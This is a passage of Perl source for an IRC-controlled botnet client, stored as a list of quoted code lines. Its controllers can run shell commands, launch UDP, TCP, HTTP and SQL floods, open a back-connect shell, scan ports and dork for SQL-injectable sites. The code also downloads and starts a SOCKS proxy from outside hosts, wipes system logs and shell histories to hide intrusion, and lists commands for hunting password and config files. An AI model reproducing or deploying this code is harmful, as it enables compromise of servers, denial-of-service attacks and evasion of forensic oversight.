            "   select(undef, undef, undef, 0.01); #sleeping for a fraction of a second keeps the script from running to 100 cpu usage ^_^",
            "   delete($irc_servers{''}) if (defined($irc_servers{''}));",
            "   my @ready = $sel_cliente->can_read(0);",
            "   next unless(@ready);",
            "   foreach $fh (@ready) {",
            "      $IRC_cur_socket = $fh;",
            "      $meunick = $irc_servers{$IRC_cur_socket}{'nick'};",
            "      $nread = sysread($fh, $msg, 4096);",
            "      if ($nread == 0) {",
            "         $sel_cliente->remove($fh);",
            "         $fh->close;",
            "         delete($irc_servers{$fh});",
            "      }",
            "      @lines = split (/\\n/, $msg);",
            "      for(my $c=0; $c<= $#lines; $c++) {",
            "         $line = $lines[$c];",
            "         $line=$line_temp.$line if ($line_temp);",
            "         $line_temp='';",
            "         $line =~ s/\\r$//;",
            "         unless ($c == $#lines) {",
            "            parse(\"$line\");",
            "         } else {",
            "            if ($#lines == 0) {",
            "               parse(\"$line\");",
            "            } elsif ($lines[$c] =~ /\\r$/) {",
            "               parse(\"$line\");",
            "            } elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) {",
            "               parse(\"$line\"); ",
            "            } else {",
            "               $line_temp = $line;",
            "            }",
            "         }",
            "      }",
            "   }",
            "sub parse {",
            "   my $servarg = shift;",
            "   if ($servarg =~ /^PING \\:(.*)/) {",
            "      sendraw(\"PONG :$1\");",
            "   } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) {",
            "      my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;",
            "      if ($args =~ /^\\001VERSION\\001$/) {",
            "         notice(\"$pn\", \"\\001VERSION mIRC v6.17 deMoNikz\\001\");",
            "      }",
            "      if (grep {$_ =~ /^\\Q$pn\\E$/i } @adms ) {",
            "         if ($onde eq \"$meunick\"){",
            "            shell(\"$pn\", \"$args\");",
            "         }",
            "#End of Connect",
            "         if ($args =~ /^(\\Q$meunick\\E|\\!cox)\\s+(.*)/ ) {",
            "            my $natrix = $1;",
            "            my $arg = $2;",
            "            if ($arg =~ /^\\!(.*)/) {",
            "               ircase(\"$pn\",\"$onde\",\"$1\") unless ($natrix eq \"!cox\" and $arg =~ /^\\!nick/);",
            "            } elsif ($arg =~ /^\\@(.*)/) {",
            "               $ondep = $onde;",
            "               $ondep = $pn if $onde eq $meunick;",
            "               bfunc(\"$ondep\",\"$1\");",
            "            } else {",
            "               shell(\"$onde\", \"$arg\");",
            "            }",
            "         }",
            "      }",
            "   }",
            "######################### End of prefix",
            "   elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) {",
            "      if (lc($1) eq lc($meunick)) {",
            "         $meunick=$4;",
            "         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "      }",
            "   } elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) {",
            "      nick(\"$meunick|\".int rand(999999));",
            "   } elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) {",
            "      $meunick = $2;",
            "      $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "      $irc_servers{$IRC_cur_socket}{'nome'} = \"$1\";",
            "      foreach my $canal (@canais) {",
            "         sendraw(\"JOIN $canal $key\");",
            "      }",
            "   }",
            "sub bfunc {",
            "   my $printl = $_[0];",
            "   my $funcarg = $_[1];",
            "   if (my $pid = fork) {",
            "      waitpid($pid, 0);",
            "   } else {",
            "      if (fork) {",
            "         exit;",
            "      } else {",
            "         if ($funcarg =~ /^killme/) {",
            "            sendraw($IRC_cur_socket, \"QUIT :\");",
            "            $killd = \"kill -9 \".fork;",
            "            system (`$killd`);",
            "         }",
            "######################",
            "#                    Commands                      #",
            "######################",
            "         if ($funcarg =~ /^commands/) {",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4,1[",
            "9-[jerinx B0T Commands List]-",
            "] \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4,1[",
            "8-----[Ready/Hacking Based]-----",
            "] \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9multiscan <vuln> <dork>\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9socks5\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9sql <vuln> <dork>\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9portscan <ip>\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9logcleaner\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9sendmail <subject> <sender> <recipient> <message>\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9system\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9cleartmp\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9rootable\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9nmap <ip> <beginport> <endport>\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9back <ip><port>\");   ",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9linuxhelp\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9cd tmp:. | for example\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4,1[",
            "8-----[Advisory/New Based]-----",
            "] \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9packetstorm\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9milw0rm\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4,1[",
            "8-----[DDos Based]-----",
            "] \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9udpflood <host> <packet size> <time>\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9tcpflood <host> <port> <packet size> <time>\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9httpflood <host> <time>\"); ",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9sqlflood <host> <time>\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4,1[",
            "8-----[IRC Based]-----",
            "] \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9killme\");   ",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9join #channel\");   ",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9part #channel\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9reset\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9voice <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9owner <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9deowner <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9dcoxice <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9halfop <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9dehalfop <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9op <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9deop <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4,1[",
            "8-----[Flooding Based]-----",
            "] \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9msgflood <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9dccflood <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9ctcpflood <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9noticeflood <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9channelflood\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9maxiflood <who> \");",
            "         if ($funcarg =~ /^linuxhelp/) {",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4,1[",
            "8-----[Linux Help]-----",
            "] \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "14@ ",
            "9Dir where you are : pwd\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "14@ ",
            "9Start a Perl file : perl file.pl\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "14@ ",
            "9Go back from dir : cd ..\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "14@ ",
            "9Force to Remove a file/dir : rm -rf file/dir;ls -la\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "14@ ",
            "9Show all files/dir with permissions : ls -lia\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "14@ ",
            "9Find config.inc.php files : find / -type f -name config.inc.php\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "14@ ",
            "9Find all writable folders and files : find / -perm -2 -ls\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "14@ ",
            "9Find all .htpasswd files : find / -type f -name .htpasswd\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "14@ ",
            "9Find all service.pwd files : find / -type f -name service.pwd\");",
            "         }",
            "         ",
            "         if ($funcarg =~ /^help/) {",
            "             sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4,1[",
            "8-----[Help Commands]-----",
            "] \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9flooding - For IRC Flooding Help\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9irc - For IRC cox Command Help \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9ddos - For DDos Command Help\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9news - For Security News Command Help \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9hacking - For Hacking Command Help\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9linuxhelp - For Linux Help\");",
            "         }",
            "         if ($funcarg =~ /^flooding/) {",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4,1[",
            "8-----[Flooding Based]-----",
            "] \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9msgflood <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9dccflood <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9ctcpflood <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9noticeflood <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9channelflood\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9maxiflood <who> \");",
            "         }",
            "         ",
            "         if ($funcarg =~ /^irc/) {",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12,1[",
            "8-----[IRC Commands]-----",
            "] \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9voice <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9owner <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9deowner <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9dcoxice <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9halfop <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9dehalfop <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9op <who> \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9deop <who> \");",
            "         }   ",
            "         ",
            "         if ($funcarg =~ /^ddos/) {",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12,1[",
            "8-----[Ddos Commands]-----",
            "] \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9udpflood <host> <packet size> <time>\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9tcpflood <host> <port> <packet size> <time>\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9httpflood <host> <time>\"); ",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9sqlflood <host> <time>\");",
            "         }   ",
            "         if ($funcarg =~ /^news/) {",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12,1[",
            "8-----[News Commands]-----",
            "] \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9packetstorm\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9milw0rm\");",
            "         }   ",
            "         if ($funcarg =~ /^hacking/) {",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12,1[",
            "8-----[Hacking Commands]-----",
            "] \");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9multiscan <vuln> <dork>\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9socks5\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9portscan <ip>\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9logcleaner\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9sendmail <subject> <sender> <recipient> <message>\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9system\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9cleartmp\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9rootable\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9nmap <ip> <beginport> <endport>\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9back <ip><port>\");   ",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9linuxhelp\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4!cox ",
            "9cd tmp:. | for example\");",
            "         }                  ",
            "######################",
            "#   End of  Help     #",
            "######################",
            "######################",
            "#     Commands       #",
            "######################",
            "         if ($funcarg =~ /^system/) {",
            "            $uname=`uname -a`;",
            "            $uptime=`uptime`;",
            "            $ownd=`pwd`;",
            "            $distro=`cat /etc/issue`;",
            "            $id=`id`;",
            "            $un=`uname -sro`;",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:",
            "4System Info",
            "12:.",
            "12Info cox : 7 Servidor :Hiden : 6667\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:",
            "4System Info",
            "12:.",
            "12Uname -a     : ",
            "4 $uname\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:",
            "4System Info",
            "12:.",
            "12Uptime       : ",
            "4 $uptime\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:",
            "4System Info",
            "12:.",
            "12Own Prosses  : ",
            "4 $processo\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:",
            "4System Info",
            "12:.",
            "12ID           : ",
            "4 $id\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:",
            "4System Info",
            "12:.",
            "12Own Dir      : ",
            "4 $ownd\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:",
            "4System Info",
            "12:.",
            "12OS           : ",
            "4 $distro\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:",
            "4System Info",
            "12:.",
            "12Owner        : ",
            "4 HZ\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:",
            "4System Info",
            "12:.",
            "12Channel      : ",
            "4 #hackzone\");",
            "         }",
            "         if ($funcarg =~ /^milw0rm/) {",
            "            my @ltt=();",
            "            my @bug=();",
            "            my $x;",
            "            my $page=\"\";",
            "            my $socke = IO::Socket::INET->new(PeerAddr=>\"milw0rm.com\",PeerPort=>\"80\",Proto=>\"tcp\") or return;",
            "            print $socke \"GET http://milw0rm.com/rss.php HTTP/1.0\\r\\nHost: milw0rm.com\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";",
            "            my @r = <$socke>;",
            "            $page=\"@r\";",
            "            close($socke);",
            "            while ($page =~  m/<title>(.*)</g){",
            "               $x = $1;",
            "               if ($x =~ /\\&lt\\;/) {",
            "                  $x =~ s/\\&lt\\;/</g;",
            "               }         ",
            "               if ($x !~ /milw0rm/) {",
            "                  push (@bug,$x);",
            "               }",
            "            }",
            "            while ($page =~  m/<link.*expl.*([0-9]...)</g) {",
            "               if ($1 !~ m/milw0rm.com|exploits|en/){",
            "                  push (@ltt,\"http://www.milw0rm.com/exploits/$1 \");",
            "               }",
            "            }",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:",
            "9milw0rm",
            "12:.",
            "12 Latest exploits :\");",
            "            foreach $x (0..(@ltt - 1)) {",
            "               sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:",
            "9milw0rm",
            "12:.",
            "12  $bug[$x] - $ltt[$x]\");",
            "               sleep 1;",
            "            }",
            "         }",
            "######################",
            "#      Portscan      #",
            "######################",
            "         if ($funcarg =~ /^portscan (.*)/) {",
            "            my $hostip=\"$1\";",
            "            @portas=(\"15\",\"19\",\"98\",\"20\",\"21\",\"22\",\"23\",\"25\",\"37\",\"39\",\"42\",\"43\",\"49\",\"53\",\"63\",\"69\",\"79\",\"80\",\"101\",\"106\",\"107\",\"109\",\"110\",\"111\",\"113\",\"115\",\"117\",\"119\",\"135\",\"137\",\"139\",\"143\",\"174\",\"194\",\"389\",\"389\",\"427\",\"443\",\"444\",\"445\",\"464\",\"488\",\"512\",\"513\",\"514\",\"520\",\"540\",\"546\",\"548\",\"565\",\"609\",\"631\",\"636\",\"694\",\"749\",\"750\",\"767\",\"774\",\"783\",\"808\",\"902\",\"988\",\"993\",\"994\",\"995\",\"1005\",\"1025\",\"1033\",\"1066\",\"1079\",\"1080\",\"1109\",\"1433\",\"1434\",\"1512\",\"2049\",\"2105\",\"2432\",\"2583\",\"3128\",\"3306\",\"4321\",\"5000\",\"5222\",\"5223\",\"5269\",\"5555\",\"6660\",\"6661\",\"6662\",\"6663\",\"6665\",\"6666\",\"6667\",\"6668\",\"6669\",\"7000\",\"7001\",\"7741\",\"8000\",\"8018\",\"8080\",\"8200\",\"10000\",\"19150\",\"27374\",\"31310\",\"33133\",\"33733\",\"55555\");",
            "            my (@aberta, %porta_banner);",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Port-Scanner",
            "12] Scanning for open ports on \".$1.\" ",
            "12 started .\");",
            "            foreach my $porta (@portas)  {",
            "               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>",
            "                  'tcp', Timeout => 4);",
            "               if ($scansock) {",
            "                  push (@aberta, $porta);",
            "                  $scansock->close;",
            "               }",
            "            }",
            "            if (@aberta) {",
            "               sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Port-Scanner",
            "12] Open ports founded: @aberta\");",
            "            } else {",
            "               sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Port-Scanner",
            "12] No open ports foundend.\");",
            "            }",
            "         }",
            "######################",
            "#  End of  Portscan  #",
            "#####################",
            "#####################",
            "# Chk The News from PacketStorm#",
            "######################",
            "if ($funcarg =~ /^packetstorm/) { ",
            "   my $c=0;",
            "   my $x;",
            "   my @ttt=();",
            "   my @ttt1=(); ",
            "   my $sock = IO::Socket::INET->new(PeerAddr=>\"www.packetstormsecurity.org\",PeerPort=>\"80\",Proto=>\"tcp\") or return; ",
            "   print $sock \"GET /whatsnew20.xml HTTP/1.0\\r\\n\";",
            "   print $sock \"Host: www.packetstormsecurity.org\\r\\n\";",
            "   print $sock \"Accept: */*\\r\\n\";",
            "   print $sock \"User-Agent: Mozilla/5.0\\r\\n\\r\\n\"; ",
            "   my @r = <$sock>;",
            "   $page=\"@r\";",
            "   close($sock);",
            "   while ($page =~  m/<link>(.*)<\\/link>/g)",
            "   {",
            "           push(@ttt,$1);",
            "   }",
            "   while ($page =~  m/<description>(.*)<\\/description>/g)",
            "   { ",
            "          push(@ttt1,$1);",
            "   }",
            "   foreach $x (0..(@ttt - 1))",
            "   {",
            "         sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9PacketStorm",
            "12] \".$ttt[$x].\"",
            " \".$ttt1[$x].\"\");",
            "      sleep 3;",
            "      $c++;",
            "   }",
            "######################",
            "#Auto Install Socks V5 using Mocks#",
            "######################",
            "if ($funcarg =~ /^socks5/) {",
            "   sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SocksV5",
            "12 Installing Mocks please wait",
            "4\");",
            "      system 'cd /tmp';",
            "      system 'wget http://switch.dl.sourceforge.net/sourceforge/mocks/mocks-0.0.2.tar.gz';",
            "      system 'tar -xvfz mocks-0.0.2.tar.gz';",
            "      system 'rm -rf mocks-0.0.2.tar.gz';",
            "      system 'cd mocks-0.0.2';",
            "      system 'rm -rf mocks.conf';",
            "      system 'curl -O http://andromeda.covers.de/221/mocks.conf';",
            "      system 'touch mocks.log';",
            "      system 'chmod 0 mocks.log';",
            "         sleep(2);",
            "      system './mocks start';",
            "         sleep(4);",
            "      sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SocksV5",
            "12 Looks like its succesfully installed lets do the last things",
            "4   \");",
            "      #lets grab ip",
            "      $net = `/sbin/ifconfig | grep 'eth0'`;",
            "      if (length($net))",
            "      {",
            "      $net = `/sbin/ifconfig eth0 | grep 'inet addr'`;",
            "      if (!length($net))",
            "      {",
            "      $net = `/sbin/ifconfig eth0 | grep 'inet end.'`;",
            "      }",
            "         if (length($net))",
            "      {",
            "         chop($net);",
            "         @netip = split/:/,$net;",
            "         $netip[1] =~ /(\\d{1,3}).(\\d{1,3}).(\\d{1,3}).(\\d{1,3})/;",
            "         $ip = $1 .\".\". $2 .\".\". $3 .\".\". $4;",
            "         ",
            "            #and print it ^^   ",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SocksV5",
            "12] Connect here :",
            "4 \". $ip .\":8787 \");",
            "         }",
            "      else",
            "   {",
            "      sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SocksV5",
            "12] IP not founded \");",
            "   }",
            "else",
            "      sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SocksV5",
            "12] ERROR WHILE INSTALLING MOCKS \");",
            "######################",
            "#        Nmap        # ",
            "######################",
            "   if ($funcarg =~ /^nmap\\s+(.*)\\s+(\\d+)\\s+(\\d+)/){",
            "         my $hostip=\"$1\";",
            "         my $portstart = \"$2\";",
            "         my $portend = \"$3\";",
            "         my (@abertas, %porta_banner);",
            "       sendraw($IRC_cur_socket, \"PRIVMSG $printl : Nmap PortScan 12:. 4|  4: $1:. |.: 4Ports 12:.  4 $2-$3\");",
            "       foreach my $porta ($portstart..$portend){",
            "               my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime);",
            "    if ($scansock) {",
            "                 push (@abertas, $porta);",
            "                 $scansock->close;",
            "                 if ($xstats){",
            "        sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Nmap",
            "12]  Nmap PortScan :. |Founded  4 $porta\".\"/Open\");",
            "                 }",
            "               }",
            "             }",
            "             if (@abertas) {",
            "        sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Nmap",
            "12]  Nmap PortScan 12:. 4| Complete \");",
            "             } else {",
            "        sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Nmap",
            "12]  Nmap PortScan 12:. 4| No open ports have been founded  13\");",
            "             }",
            "          }",
            "######################",
            "#    End of Nmap     # ",
            "######################",
            "######################",
            "#    Log Cleaner     # ",
            "######################",
            "if ($funcarg =~ /^logcleaner/) {",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Log-Cleaner",
            "12]  LogCleaner :. |  This process can be long, just wait\");",
            "    system 'rm -rf /var/log/lastlog';",
            "    system 'rm -rf /var/log/wtmp';",
            "   system 'rm -rf /etc/wtmp';",
            "   system 'rm -rf /var/run/utmp';",
            "   system 'rm -rf /etc/utmp';",
            "   system 'rm -rf /var/log';",
            "   system 'rm -rf /var/logs';",
            "   system 'rm -rf /var/adm';",
            "   system 'rm -rf /var/apache/log';",
            "   system 'rm -rf /var/apache/logs';",
            "   system 'rm -rf /usr/local/apache/log';",
            "   system 'rm -rf /usr/local/apache/logs';",
            "   system 'rm -rf /root/.bash_history';",
            "   system 'rm -rf /root/.ksh_history';",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Log-Cleaner",
            "12]  LogCleaner :. |  All default log and bash_history files erased\");",
            "      sleep 1;",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Log-Cleaner",
            "12]  LogCleaner :. |  Now Erasing the rest of the machine log files\");",
            "   system 'find / -name *.bash_history -exec rm -rf {} \\;';",
            "   system 'find / -name *.bash_logout -exec rm -rf {} \\;';",
            "   system 'find / -name \"log*\" -exec rm -rf {} \\;';",
            "   system 'find / -name *.log -exec rm -rf {} \\;';",
            "      sleep 1;",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Log-Cleaner",
            "12]  LogCleaner :. |  Done! All logs erased\");",
            "      }",
            "######################",
            "# End of Log Cleaner # ",
            "######################",
            "######################",
            "#              SQL SCANNER              #",
            "######################",
            "if ($funcarg =~ /^sql2\\s+(.*?)\\s+(.*)\\s+(\\d+)/){",
            "   if (my $pid = fork) {",
            "      waitpid($pid, 0);",
            "   } else {",
            "      if (my $d=fork()) {",
            "         addproc($d,\"[SQL2] $2\");",
            "         exit;",
            "      } else {",
            "         ",
            "         my $bug=$1;",
            "         my $dork=$2;",
            "         my $contatore=0;",
            "         my ($type,$space);",
            "         my %hosts;",
            "         my $columns=$3;",
            "         ",
            "                        ### Start Message",
            "                        sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SQL-Scanner",
            "12] Starting Scan for ",
            "4$bug $dork\");",
            "                        sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SQL-Scanner",
            "12] Initializing on ",
            "12Search Engines \");",
            "                        ### End of Start Message",
            "            # Starting Google",
            "            my @glist=&google($dork);",
            "                        sendraw($IRC_cur_socket, \"PRIVMSG $printl ",
            "9SQL-Scanner",
            "\".scalar(@glist).\"",
            " Sites\");",
            "                        my @mlist=&msn($dork);",
            "                        my @asklist=&ask($dork);",
            "                        my @allist=&alltheweb($dork);",
            "                        my @aollist=&aol($dork);",
            "                        my @lycos=&lycos($dork);",
            "                        my @ylist=&yahoo($dork);",
            "                        my @mzlist=&mozcox($dork);",
            "                        my @mamalist&mamma($dork);",
            "                        my @hlist=&hotcox($dork);",
            "                        my @altlist=&altavista($dork);",
            "                        my @slist=&search($dork);",
            "                        my @ulist=&uol($dork);",
            "                        my @fireball=&fireball($dork);   ",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SQL-Scanner",
            "\".scalar(@glist).\"",
            " Sites\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SQL-Scanner",
            "MSN ",
            "\".scalar(@mlist).\"",
            " Sites\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SQL-Scanner",
            "AllTheWeb ",
            "\".scalar(@allist).\"",
            " Sites\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SQL-Scanner",
            "Ask.com ",
            "\".scalar(@asklist).\"",
            " Sites\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SQL-Scanner",
            "AOL ",
            "\".scalar(@aollist).\"",
            " Sites\");",
